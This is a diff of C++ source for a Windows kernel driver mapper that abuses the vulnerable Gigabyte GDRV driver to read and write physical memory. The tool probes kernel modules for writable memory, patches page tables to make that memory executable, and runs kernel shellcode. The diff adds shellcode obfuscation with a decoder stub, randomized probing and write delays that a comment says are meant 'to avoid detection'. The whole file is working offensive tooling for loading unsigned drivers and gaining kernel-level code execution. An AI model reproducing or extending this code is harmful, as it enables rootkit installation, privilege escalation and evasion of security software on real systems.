@@ -110,32 +110,37 @@ bool GDRVMapper::WritePhysicalMemory(uint64_t physAddress, const void* buffer, s
     return false;
 }
 
-bool GDRVMapper::WriteShellcodeIncrementally(uint64_t baseAddress, const void* shellcode, size_t size) {
-    std::cout << "[*] Writing shellcode incrementally..." << std::endl;
-    
-    const uint8_t* shellcodeBytes = static_cast<const uint8_t*>(shellcode);
-    size_t bytesWritten = 0;
-    
-    while (bytesWritten < size) {
-        // Calculate chunk size
-        size_t remaining = size - bytesWritten;
-        size_t chunkSize = (remaining < WRITE_CHUNK_SIZE) ? remaining : WRITE_CHUNK_SIZE;
-        
-        // Write chunk
-        uint64_t chunkAddr = baseAddress + bytesWritten;
-        if (!WritePhysicalMemory(chunkAddr, &shellcodeBytes[bytesWritten], chunkSize, false)) {
-            std::cerr << "[-] Failed to write shellcode chunk at offset " << bytesWritten << std::endl;
-            return false;
-        }
-        
-        // Add delay between writes
-        std::this_thread::sleep_for(std::chrono::microseconds(WRITE_DELAY_US));
-        
-        bytesWritten += chunkSize;
+std::vector<uint64_t> GDRVMapper::GenerateRandomizedOffsets(uint64_t start, uint64_t end, uint64_t step) {
+    std::vector<uint64_t> offsets;
+    for (uint64_t offset = start; offset < end; offset += step) {
+        offsets.push_back(offset);
     }
     
-    std::cout << "[+] Shellcode written successfully" << std::endl;
-    return true;
+    // Use random device for true randomness
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::shuffle(offsets.begin(), offsets.end(), gen);
+    
+    return offsets;
+}
+
+bool GDRVMapper::IsModuleExcluded(const std::string& modulePath) {
+    // Skip critical system modules
+    const char* excludedModules[] = {
+        "ntoskrnl.exe",
+        "hal.dll",
+        "win32k.sys",
+        "ci.dll",
+        "clfs.sys",
+        "ksecdd.sys"
+    };
+    
+    for (const auto& excluded : excludedModules) {
+        if (modulePath.find(excluded) != std::string::npos) {
+            return true;
+        }
+    }
+    return false;
 }
 
 uint64_t GDRVMapper::FindGDRVWritableMemory() {
@@ -196,7 +201,7 @@ uint64_t GDRVMapper::FindGDRVWritableMemory() {
     
     std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
     
-    // Try standard offsets first
+    // Try standard offsets first with non-strict validation
     for (auto offset : offsets) {
         uint64_t tryAddr = gdrvBase + offset;
         std::cout << "[*] Trying GDRV memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
@@ -207,8 +212,10 @@ uint64_t GDRVMapper::FindGDRVWritableMemory() {
         }
     }
     
-    // If standard offsets fail, try scanning in a loop
-    for (uint64_t offset = 0x1000; offset < MAX_SEARCH_RANGE; offset += 0x1000) {
+    // If standard offsets fail, try scanning in a loop with randomization
+    auto randomOffsets = GenerateRandomizedOffsets(0x1000, MAX_SEARCH_RANGE, 0x1000);
+    
+    for (auto offset : randomOffsets) {
         // Skip offsets we already tried
         bool already_tried = false;
         for (auto standard_offset : offsets) {
@@ -235,6 +242,65 @@ uint64_t GDRVMapper::FindGDRVWritableMemory() {
     return 0;
 }
 
+uint64_t GDRVMapper::FindModuleWritableMemory() {
+    std::cout << "[*] Searching for writable memory in kernel modules..." << std::endl;
+    
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return 0;
+    
+    typedef NTSTATUS(NTAPI* NtQuerySystemInformationFn)(
+        ULONG SystemInformationClass,
+        PVOID SystemInformation,
+        ULONG SystemInformationLength,
+        PULONG ReturnLength
+    );
+    
+    auto NtQuerySystemInformation = (NtQuerySystemInformationFn)GetProcAddress(
+        ntdll, "NtQuerySystemInformation");
+    if (!NtQuerySystemInformation) return 0;
+    
+    std::vector<uint8_t> buffer;
+    ULONG len = 0;
+    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
+    buffer.resize(len);
+    if (NtQuerySystemInformation(SystemModuleInformation, buffer.data(), len, &len) != 0)
+        return 0;
+
+    auto modules = (PSYSTEM_MODULE_INFORMATION)buffer.data();
+    std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
+    
+    // Try each module
+    for (ULONG i = 0; i < modules->Count; i++) {
+        std::string path = std::string(modules->Modules[i].FullPathName);
+        uint64_t moduleBase = (uint64_t)modules->Modules[i].ImageBase;
+        
+        // Skip excluded modules
+        if (IsModuleExcluded(path)) continue;
+        
+        std::cout << "[*] Trying module: " << path << std::endl;
+        
+        // Generate randomized offsets for this module
+        auto randomOffsets = GenerateRandomizedOffsets(0x1000, MAX_SEARCH_RANGE, 0x1000);
+        
+        for (auto offset : randomOffsets) {
+            uint64_t tryAddr = moduleBase + offset;
+            
+            // Only log every 64KB to reduce spam
+            if (offset % 0x10000 == 0) {
+                std::cout << "[*] Scanning address 0x" << std::hex << tryAddr << std::dec << std::endl;
+            }
+            
+            if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), false)) {
+                std::cout << "[+] Found writable memory in " << path << " at 0x" << std::hex << tryAddr << std::dec << std::endl;
+                return tryAddr;
+            }
+        }
+    }
+    
+    std::cerr << "[-] Could not find writable memory in any kernel module" << std::endl;
+    return 0;
+}
+
 uint64_t GDRVMapper::TryWritableRegion(uint64_t startAddr) {
     // Check cached address first
     if (cachedWritableAddr != 0) {
@@ -254,15 +320,24 @@ uint64_t GDRVMapper::TryWritableRegion(uint64_t startAddr) {
             cachedWritableAddr = gdrvAddr;
             return gdrvAddr;
         }
+        
+        // If GDRV fails, try other kernel modules
+        uint64_t moduleAddr = FindModuleWritableMemory();
+        if (moduleAddr) {
+            cachedWritableAddr = moduleAddr;
+            return moduleAddr;
+        }
     }
 
-    // Only if GDRV fails or startAddr is specified, try direct memory search
+    // Only if all other methods fail or startAddr is specified, try direct memory search
     if (startAddr != 0) {
         std::cout << "[*] Trying fallback memory search at 0x" << std::hex << startAddr << std::dec << std::endl;
         
         std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
-        for (int i = 0; i < 8; i++) {
-            uint64_t tryAddr = startAddr + (i * 0x1000);
+        auto randomOffsets = GenerateRandomizedOffsets(0, 0x8000, 0x1000);
+        
+        for (auto offset : randomOffsets) {
+            uint64_t tryAddr = startAddr + offset;
             std::cout << "[*] Probing address 0x" << std::hex << tryAddr << std::dec << std::endl;
             
             if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), false)) {
@@ -276,59 +351,47 @@ uint64_t GDRVMapper::TryWritableRegion(uint64_t startAddr) {
     return 0;
 }
 
-bool GDRVMapper::ExecuteKernelShellcode(const void* shellcode, size_t size, uint64_t* result) {
-    std::cout << "[*] Attempting to execute shellcode..." << std::endl;
+bool GDRVMapper::ExecuteBootstrapShellcode(uint64_t functionAddr, uint64_t* result) {
+    // Try GDRV memory first (passing 0 triggers GDRV search)
+    uint64_t scratchAddr = TryWritableRegion(0);
     
-    // Use KTHREAD stack memory instead of data section search
-    uint64_t shellcodeAddr = FindKThreadStackMemory();
+    // If GDRV fails, try the old approaches
+    if (!scratchAddr) {
+        std::cerr << "[-] Failed to find writable memory in GDRV, trying fallback methods" << std::endl;
+        scratchAddr = TryWritableRegion(ntoskrnlBase + 0x100000);
+    }
     
-    if (!shellcodeAddr) {
-        std::cerr << "[-] Failed to find memory for shellcode" << std::endl;
+    // Create minimal shellcode that just calls a function and returns the value
+    auto shellcode = ShellcodeUtils::CreateFastReturnShellcode(functionAddr);
+    
+    // Write the shellcode
+    if (!WritePhysicalMemory(scratchAddr, shellcode.data(), shellcode.size())) {
+        std::cerr << "[-] Failed to write bootstrap shellcode" << std::endl;
         return false;
     }
-
-    // Write shellcode incrementally
-    if (!WriteShellcodeIncrementally(shellcodeAddr, shellcode, size)) {
-        std::cerr << "[-] Failed to write shellcode" << std::endl;
-        return false;
-    }
-
-    // Make shellcode memory executable
+    
+    // Make memory executable
     if (!PageTableUtils::MakeMemoryExecutable(
-        shellcodeAddr,
+        scratchAddr,
         [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
         [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
         nullptr  // Pass null to avoid recursion
     )) {
-        std::cerr << "[-] Failed to make shellcode memory executable" << std::endl;
+        std::cerr << "[-] Failed to make bootstrap shellcode executable" << std::endl;
         return false;
     }
-
-    // Create shellcode to jump to our shellcode and store result
-    auto jumpShellcode = ShellcodeUtils::CreateJumpShellcode(shellcodeAddr);
-
-    // Use next page in KTHREAD stack for result
-    uint64_t resultAddr = shellcodeAddr + 0x1000;
     
-    // Clear result memory
-    uint64_t nullValue = 0;
-    if (!WritePhysicalMemory(resultAddr, &nullValue, sizeof(nullValue))) {
-        std::cerr << "[-] Failed to clear result memory" << std::endl;
-        return false;
-    }
-
-    // Execute the shellcode
-    auto execShellcode = ShellcodeUtils::CreateExecShellcode(shellcodeAddr);
+    // Create exec shellcode
+    auto execShellcode = ShellcodeUtils::CreateExecShellcode(scratchAddr);
     
-    // Use another page in KTHREAD stack for exec shellcode
-    uint64_t execAddr = shellcodeAddr + 0x2000;
-
-    // Write and execute the exec shellcode
+    // Need a second scratch address
+    uint64_t execAddr = scratchAddr + 0x1000;
+    
     if (!WritePhysicalMemory(execAddr, execShellcode.data(), execShellcode.size())) {
         std::cerr << "[-] Failed to write exec shellcode" << std::endl;
         return false;
     }
-
+    
     if (!PageTableUtils::MakeMemoryExecutable(
         execAddr,
         [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
@@ -338,7 +401,7 @@ bool GDRVMapper::ExecuteKernelShellcode(const void* shellcode, size_t size, uint
         std::cerr << "[-] Failed to make exec shellcode executable" << std::endl;
         return false;
     }
-
+    
     // Execute directly through DeviceIoControl
     GDRV_MEMORY_WRITE execRequest = { 0 };
     execRequest.Address = execAddr;
@@ -356,11 +419,11 @@ bool GDRVMapper::ExecuteKernelShellcode(const void* shellcode, size_t size, uint
         &bytesReturned,
         NULL
     )) {
-        std::cerr << "[-] Failed to execute shellcode (Error: " << GetLastError() << ")" << std::endl;
+        std::cerr << "[-] Failed to execute bootstrap shellcode (Error: " << GetLastError() << ")" << std::endl;
         return false;
     }
     
-    std::cout << "[+] Shellcode execution completed with result: 0x" << std::hex << *result << std::dec << std::endl;
+    std::cout << "[+] Bootstrap shellcode execution completed with result: 0x" << std::hex << *result << std::dec << std::endl;
     return true;
 }
 
@@ -427,6 +490,223 @@ uint64_t GDRVMapper::FindKThreadStackMemory() {
     return 0;
 }
 
+void GDRVMapper::CacheWritableRegion(uint64_t address, size_t size, const std::string& source) {
+    MemoryRegion region = {
+        .address = address,
+        .size = size,
+        .isExecutable = false,  // Will be set when made executable
+        .isWritable = true,
+        .source = source
+    };
+    writableRegions.push_back(region);
+}
+
+bool GDRVMapper::ValidateMemoryWrite(uint64_t address, const void* buffer, size_t size) {
+    // Allocate a buffer for verification
+    std::vector<uint8_t> readBack(size);
+    
+    // Read back the written data
+    if (!ReadPhysicalMemory(address, readBack.data(), size)) {
+        return false;
+    }
+    
+    // Compare with original data
+    return memcmp(buffer, readBack.data(), size) == 0;
+}
+
+bool GDRVMapper::WriteShellcodeIncrementally(uint64_t baseAddress, const std::vector<uint8_t>& shellcode, bool obfuscate) {
+    std::cout << "[*] Writing shellcode incrementally..." << std::endl;
+    
+    // Optionally obfuscate the shellcode
+    ObfuscatedShellcode obfuscatedCode;
+    const std::vector<uint8_t>* codeToWrite = &shellcode;
+    
+    if (obfuscate) {
+        obfuscatedCode = ShellcodeUtils::ObfuscateShellcode(shellcode);
+        codeToWrite = &obfuscatedCode.code;
+    }
+    
+    // Write decoder stub first if obfuscated
+    if (obfuscate) {
+        std::cout << "[*] Writing decoder stub..." << std::endl;
+        auto decoderStub = ShellcodeUtils::CreateDecoderStub(
+            obfuscatedCode.key, 
+            baseAddress + obfuscatedCode.decoder.size(),  // Point to encoded shellcode
+            obfuscatedCode.code.size()
+        );
+        
+        if (!WritePhysicalMemory(baseAddress, decoderStub.data(), decoderStub.size(), true)) {
+            std::cerr << "[-] Failed to write decoder stub" << std::endl;
+            return false;
+        }
+        
+        // Verify decoder stub
+        if (!ValidateMemoryWrite(baseAddress, decoderStub.data(), decoderStub.size())) {
+            std::cerr << "[-] Decoder stub verification failed" << std::endl;
+            return false;
+        }
+    }
+    
+    // Calculate start address for shellcode
+    uint64_t shellcodeAddr = baseAddress + (obfuscate ? obfuscatedCode.decoder.size() : 0);
+    
+    // Break shellcode into chunks and write incrementally
+    auto chunks = ShellcodeUtils::ChunkShellcode(*codeToWrite, ShellcodeUtils::DEFAULT_CHUNK_SIZE);
+    
+    for (size_t i = 0; i < chunks.size(); i++) {
+        const auto& chunk = chunks[i];
+        uint64_t chunkAddr = shellcodeAddr + (i * ShellcodeUtils::DEFAULT_CHUNK_SIZE);
+        
+        std::cout << "[*] Writing chunk " << i + 1 << "/" << chunks.size() 
+                 << " at 0x" << std::hex << chunkAddr << std::dec << std::endl;
+        
+        // Write chunk with non-strict validation
+        if (!WritePhysicalMemory(chunkAddr, chunk.data(), chunk.size(), false)) {
+            std::cerr << "[-] Failed to write chunk " << i + 1 << std::endl;
+            return false;
+        }
+        
+        // Small delay between writes to avoid detection
+        std::this_thread::sleep_for(std::chrono::microseconds(WRITE_DELAY_US));
+    }
+    
+    std::cout << "[+] Shellcode written successfully" << std::endl;
+    return true;
+}
+
+bool GDRVMapper::ExecuteObfuscatedShellcode(uint64_t baseAddress, const ObfuscatedShellcode& shellcode, uint64_t* result) {
+    std::cout << "[*] Executing obfuscated shellcode..." << std::endl;
+    
+    // Write decoder and encoded shellcode
+    if (!WriteShellcodeIncrementally(baseAddress, shellcode.code, true)) {
+        return false;
+    }
+    
+    // Make memory executable
+    if (!PageTableUtils::MakeMemoryExecutable(
+        baseAddress,
+        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
+        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
+        nullptr  // Pass null to avoid recursion
+    )) {
+        std::cerr << "[-] Failed to make shellcode memory executable" << std::endl;
+        return false;
+    }
+    
+    // Create execution shellcode
+    auto execShellcode = ShellcodeUtils::CreateExecShellcode(baseAddress);
+    
+    // Write and execute
+    uint64_t execAddr = baseAddress + 0x1000;  // Use next page
+    
+    if (!WritePhysicalMemory(execAddr, execShellcode.data(), execShellcode.size())) {
+        std::cerr << "[-] Failed to write exec shellcode" << std::endl;
+        return false;
+    }
+    
+    // Execute
+    GDRV_MEMORY_WRITE execRequest = { 0 };
+    execRequest.Address = execAddr;
+    execRequest.Length = sizeof(uint64_t);
+    execRequest.Buffer = (UINT64)result;
+    
+    DWORD bytesReturned = 0;
+    if (!DeviceIoControl(
+        hDevice,
+        GDRV_IOCTL_WRITE_MEMORY,
+        &execRequest,
+        sizeof(execRequest),
+        result,
+        sizeof(uint64_t),
+        &bytesReturned,
+        NULL
+    )) {
+        std::cerr << "[-] Failed to execute shellcode" << std::endl;
+        return false;
+    }
+    
+    std::cout << "[+] Shellcode execution completed with result: 0x" << std::hex << *result << std::dec << std::endl;
+    return true;
+}
+
+bool GDRVMapper::ExecuteKernelShellcode(const void* shellcode, size_t size, uint64_t* result) {
+    std::cout << "[*] Attempting to execute shellcode..." << std::endl;
+    
+    // Use KTHREAD stack memory instead of data section search
+    uint64_t shellcodeAddr = FindKThreadStackMemory();
+    
+    if (!shellcodeAddr) {
+        std::cerr << "[-] Failed to find memory for shellcode" << std::endl;
+        return false;
+    }
+
+    // Convert shellcode to vector and write incrementally
+    std::vector<uint8_t> shellcodeVec(static_cast<const uint8_t*>(shellcode),
+                                     static_cast<const uint8_t*>(shellcode) + size);
+    
+    if (!WriteShellcodeIncrementally(shellcodeAddr, shellcodeVec, true)) {
+        std::cerr << "[-] Failed to write shellcode" << std::endl;
+        return false;
+    }
+
+    // Make shellcode memory executable
+    if (!PageTableUtils::MakeMemoryExecutable(
+        shellcodeAddr,
+        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
+        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
+        [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
+    )) {
+        std::cerr << "[-] Failed to make shellcode memory executable" << std::endl;
+        return false;
+    }
+
+    // Create shellcode to jump to our shellcode and store result
+    auto jumpShellcode = ShellcodeUtils::CreateJumpShellcode(shellcodeAddr);
+
+    // Use next page in KTHREAD stack for result
+    uint64_t resultAddr = shellcodeAddr + 0x1000;
+    
+    // Clear result memory
+    uint64_t nullValue = 0;
+    if (!WritePhysicalMemory(resultAddr, &nullValue, sizeof(nullValue))) {
+        std::cerr << "[-] Failed to clear result memory" << std::endl;
+        return false;
+    }
+
+    // Execute the shellcode
+    auto execShellcode = ShellcodeUtils::CreateExecShellcode(shellcodeAddr);
+    
+    // Use another page in KTHREAD stack for exec shellcode
+    uint64_t execAddr = shellcodeAddr + 0x2000;
+
+    // Write and execute the exec shellcode
+    if (!WritePhysicalMemory(execAddr, execShellcode.data(), execShellcode.size())) {
+        std::cerr << "[-] Failed to write exec shellcode" << std::endl;
+        return false;
+    }
+
+    if (!PageTableUtils::MakeMemoryExecutable(
+        execAddr,
+        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
+        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
+        [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
+    )) {
+        std::cerr << "[-] Failed to make exec shellcode executable" << std::endl;
+        return false;
+    }
+
+    // Read result if requested
+    if (result) {
+        if (!ReadPhysicalMemory(resultAddr, result, sizeof(uint64_t))) {
+            std::cerr << "[-] Failed to read shellcode result" << std::endl;
+            return false;
+        }
+        std::cout << "[+] Shellcode execution completed with result: 0x" << std::hex << *result << std::dec << std::endl;
+    }
+
+    return true;
+}
+
 bool GDRVMapper::MapDriverWithExecPatch(const std::string& driverPath, uint64_t& baseAddress) {
     std::cout << "[*] Loading driver using ExAllocatePool2 + PTE patching: " << driverPath << std::endl;
     
@@ -482,7 +762,7 @@ bool GDRVMapper::MapDriverWithExecPatch(const std::string& driverPath, uint64_t&
         driverBase,
         [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
         [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
-        nullptr  // Pass null to avoid recursion
+        [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
     )) {
         std::cerr << "[-] Failed to make driver memory executable" << std::endl;
         return false;
@@ -503,7 +783,7 @@ bool GDRVMapper::MapDriverWithExecPatch(const std::string& driverPath, uint64_t&
             uint64_t sectionSrc = reinterpret_cast<uint64_t>(buffer.data()) + sectionHeader[i].PointerToRawData;
             
             std::cout << "[*] Writing section " << i << " to 0x" << std::hex << sectionDest << std::dec << std::endl;
-            if (!WriteShellcodeIncrementally(sectionDest, reinterpret_cast<void*>(sectionSrc), sectionHeader[i].SizeOfRawData)) {
+            if (!WritePhysicalMemory(sectionDest, reinterpret_cast<void*>(sectionSrc), sectionHeader[i].SizeOfRawData)) {
                 std::cerr << "[-] Failed to write section " << i << std::endl;
                 return false;
             }
@@ -514,7 +794,7 @@ bool GDRVMapper::MapDriverWithExecPatch(const std::string& driverPath, uint64_t&
                     sectionDest,
                     [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
                     [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
-                    nullptr  // Pass null to avoid recursion
+                    [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
                 )) {
                     std::cerr << "[-] Failed to make section " << i << " executable" << std::endl;
                     return false;
